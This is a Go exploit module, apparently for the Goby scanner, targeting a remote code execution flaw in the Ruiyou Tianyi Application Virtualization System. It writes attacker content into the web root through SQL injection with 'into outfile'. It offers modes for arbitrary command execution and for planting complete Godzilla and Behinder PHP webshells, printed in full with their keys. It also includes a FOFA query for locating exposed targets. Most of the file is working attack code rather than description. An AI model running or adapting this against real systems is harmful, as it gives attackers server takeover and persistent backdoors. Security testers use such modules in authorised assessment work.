package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruiyou Tianyi Application Virtualization System Index.php File Remote Code Execution Vulnerability",
    "Description": "<p>Ruiyou Tianyi Application Virtualization System Remote Code Execution Vulnerability Intelligence (0day) allows attackers to execute arbitrary code through this vulnerability, resulting in the system being attacked and controlled. The Ruiyou Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture. It centrally deploys various user application software to the Ruiyou Tianyi service cluster, and clients can access authorized application software on the server through the WEB, achieving centralized application, remote access, collaborative office, and more.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "REALOR-Tianyi-AVS",
    "Homepage": "http://www.realor.cn/product/tianyi/",
    "DisclosureDate": "2023-04-11",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"瑞友应用虚拟化系统\" || body=\"CASMain.XGI?cmd=\" || body=\"瑞友天翼－应用虚拟化系统\" || body=\"DownLoad.XGI?pram=\"",
    "GobyQuery": "body=\"瑞友应用虚拟化系统\" || body=\"CASMain.XGI?cmd=\" || body=\"瑞友天翼－应用虚拟化系统\" || body=\"DownLoad.XGI?pram=\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://soft.realor.cn:88/Gwt7.0.3.1.exe\">http://soft.realor.cn:88/Gwt7.0.3.1.exe</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackMode",
            "type": "select",
            "value": "cmd,webShell,custom",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "dir",
            "show": "attackMode=cmd"
        },
        {
            "name": "webShell",
            "type": "select",
            "value": "Godzilla,Behinder",
            "show": "attackMode=webShell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"123\"; ?>",
            "show": "attackMode=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "瑞友天翼应用虚拟化系统 index.php 文件远程代码执行漏洞",
            "Product": "REALOR-天翼应用虚拟化系统",
            "Description": "<p>瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过WEB即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://soft.realor.cn:88/Gwt7.0.3.1.exe\" target=\"_blank\">http://soft.realor.cn:88/Gwt7.0.3.1.exe</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Ruiyou Tianyi Application Virtualization System Index.php File Remote Code Execution Vulnerability",
            "Product": "REALOR-Tianyi-AVS",
            "Description": "<p>Ruiyou Tianyi Application Virtualization System Remote Code Execution Vulnerability Intelligence (0day) allows attackers to execute arbitrary code through this vulnerability, resulting in the system being attacked and controlled. The Ruiyou Tianyi Application Virtualization System is an application virtualization platform based on server computing architecture. It centrally deploys various user application software to the Ruiyou Tianyi service cluster, and clients can access authorized application software on the server through the WEB, achieving centralized application, remote access, collaborative office, and more.</p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://soft.realor.cn:88/Gwt7.0.3.1.exe\" target=\"_blank\">http://soft.realor.cn:88/Gwt7.0.3.1.exe</a></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10768"
}`
	exploitRajikjiou := func(hostinfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, string) {
		fileName := goutils.RandomHexString(6) + ".XGI"
		bytes := []byte(content)
		hexEncoded := hex.EncodeToString(bytes)
		uri := "/index.php?s=/Index/dologin/name/demo%27)%3bselect%20unhex%28%27" + hexEncoded + "%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5C" + fileName + "%27%23/pwd/123123"
		cfg := httpclient.NewGetRequestConfig(uri)
		httpclient.DoHttpRequest(hostinfo, cfg)
		url := hostinfo.FixedHostInfo + "/" + fileName
		// 请求文件
		if resp, err := httpclient.SimpleGet(hostinfo.FixedHostInfo + "/" + fileName); err != nil || resp.StatusCode != 200 {
			return nil, ""
		} else {
			return resp, url
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(3)
			if resp, _ := exploitRajikjiou(hostinfo, fmt.Sprintf("<?php echo md5(\"%s\"); $file = __FILE__; unlink($file);", randomStr)); resp == nil {
				return false
			} else {
				return strings.Contains(resp.Utf8Html, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
			}
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := ""
			attackMode := stepLogs.Params["attackMode"].(string)
			if attackMode == "cmd" {
				// 命令执行
				content = fmt.Sprintf("<?php $output = array();exec('%s', $output);foreach ($output as $line) {echo $line . PHP_EOL;} $file = __FILE__; unlink($file);", stepLogs.Params["cmd"].(string))
			} else if attackMode == "webShell" {
				// webshell
				if stepLogs.Params["webShell"].(string) == "Godzilla" {
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){    for($i=0;$i<strlen($D);$i++) {        $c = $K[$i+1&15];        $D[$i] = $D[$i]^$c;    }    return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if (isset($_POST[$pass])){    $data=encode(base64_decode($_POST[$pass]),$key);    if (isset($_SESSION[$payloadName])){        $payload=encode($_SESSION[$payloadName],$key);        eval($payload);        echo substr(md5($pass.$key),0,16);        echo base64_encode(encode(@run($data),$key));        echo substr(md5($pass.$key),16);    }else{        if (stripos($data,"getBasicsInfo")!==false){            $_SESSION[$payloadName]=encode($data,$key);        }    }}`
				} else if stepLogs.Params["webShell"].(string) == "Behinder" {
					content = `<?php @error_reporting(0);session_start();    $key="e45e329feb5d925b";    $_SESSION['k']=$key;    session_write_close();    $post=file_get_contents("php://input");    if(!extension_loaded('openssl'))    {        $t="base64_"."decode";        $post=$t($post."");                for($i=0;$i<strlen($post);$i++) {                 $post[$i] = $post[$i]^$key[$i+1&15];                 }    }    else    {        $post=openssl_decrypt($post, "AES128", $key);    }    $arr=explode('|',$post);    $func=$arr[0];    $params=$arr[1];    class C{public function __invoke($p) {eval($p."");}}    @call_user_func(new C(),$params);?>`
				} else {
					expResult.Success = false
					expResult.Output = "未知的webshell方式"
				}
			} else if attackMode == "custom" {
				// 自定义
				content = stepLogs.Params["content"].(string)
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}

			if resp, url := exploitRajikjiou(expResult.HostInfo, content); resp == nil || url == "" {
				expResult.Output = "漏洞利用失败"
				expResult.Success = false
				return expResult
			} else {
				expResult.Success = true
				output := ""
				if attackMode == "cmd" {
					output = resp.Utf8Html
				} else if attackMode == "webShell" {
					password := "pass"
					tool := ""
					if stepLogs.Params["webShell"].(string) == "Godzilla" {
						tool = " Godzilla v3.0"
						password = "pass 加密器：PHP_XOR_BASE64"
					} else if stepLogs.Params["webShell"].(string) == "Behinder" {
						tool = " Behinder v3.0"
						password = "rebeyond"
					}
					output = strings.Join([]string{"WebShell URL: " + url, "Password: " + password, "Webshell tool: " + tool, "Webshell type: php"}, "\r\n")
					output = "WebShell URL: " + url + "\r\n" + "Password: " + password + "\r\n" + "Webshell tool: Behinder v3.0\r\n" + "Webshell type: php\r\n"
				} else {
					output = url
				}
				expResult.Output = output
				return expResult
			}
		},
	))
}
